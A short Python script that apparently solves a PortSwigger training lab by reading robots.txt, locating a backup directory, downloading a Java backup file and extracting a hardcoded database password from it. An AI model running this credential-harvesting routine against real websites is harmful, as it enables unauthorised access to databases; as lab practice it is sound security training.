import requests
import re
from bs4 import BeautifulSoup

# Replace with the lab URL base
BASE_URL = "https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files"

def get_robots_txt(url):
    r = requests.get(f"{url}/robots.txt")
    if r.status_code == 200:
        return r.text
    return ""

def find_backup_path(robots_txt):
    # Simple regex to find disallowed paths
    matches = re.findall(r'Disallow: (/.+)', robots_txt)
    for path in matches:
        if "backup" in path.lower():
            return path
    return None

def fetch_backup_file(url, backup_path, filename):
    full_url = f"{url}{backup_path}/{filename}"
    r = requests.get(full_url)
    if r.status_code == 200:
        return r.text
    return None

def extract_password(source_code):
    # Example regex to find Postgres password in typical Java code
    # This regex assumes something like password = "secret";
    pattern = r'password\s*=\s*"([^"]+)"'
    match = re.search(pattern, source_code, re.IGNORECASE)
    if match:
        return match.group(1)
    return None

def main():
    print("[*] Fetching robots.txt...")
    robots_txt = get_robots_txt(BASE_URL)
    if not robots_txt:
        print("[-] Could not fetch robots.txt or file is empty.")
        return

    print("[*] Searching for backup directory in robots.txt...")
    backup_path = find_backup_path(robots_txt)
    if not backup_path:
        print("[-] No backup directory found in robots.txt.")
        return

    print(f"[+] Found backup directory: {backup_path}")
    filename = "ProductTemplate.java.bak"

    print(f"[*] Fetching backup file: {filename}...")
    source_code = fetch_backup_file(BASE_URL, backup_path, filename)
    if not source_code:
        print(f"[-] Could not fetch the backup file {filename}.")
        return

    print("[*] Extracting password from backup source code...")
    password = extract_password(source_code)
    if password:
        print(f"[+] Database password found: {password}")
    else:
        print("[-] Password not found in the backup source code.")

if __name__ == "__main__":
    main()
